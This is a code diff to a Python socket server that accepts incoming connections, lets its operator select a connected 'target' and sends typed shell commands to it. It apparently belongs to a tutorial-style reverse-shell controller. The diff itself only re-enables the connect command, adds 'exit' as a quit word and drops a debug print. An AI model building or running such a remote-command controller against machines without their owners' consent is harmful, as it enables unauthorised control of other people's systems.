@@ -53,7 +53,6 @@ def socket_bind():
 def socket_accept():
     s.listen(5)
     conn, addr = s.accept()
-    print("accept complete")
     # This will wait until connection has been Established
     print('Connection Established at IP ' + addr[0] + 'And Port ' + str(addr[1]))
     # Addr is info about the connections
@@ -71,7 +70,7 @@ def prompt():
             list_conn()
         elif 'select' in cmd:
             conn_obj = get_tgt(cmd)
-        # elif cmd == 'connect':
+        elif cmd == 'connect':
             send_command(conn_obj)
         elif cmd == 'quit':
             return None
@@ -144,8 +143,8 @@ def send_command(conn):
             working_dir = str(conn.recv(2048), "utf-8")
             print(working_dir, end='')
             cmd = input(">>>")
-            if cmd == 'quit':
-                break
+            if cmd == 'quit' or cmd == 'exit':
+                return None
                 # A thing to remember is that stuff that's taken as input isn't bytes
                 # It's in byte type so we'll have to convert it to string manually
                 # Whenever we want to print it out to the user, it needs to be string
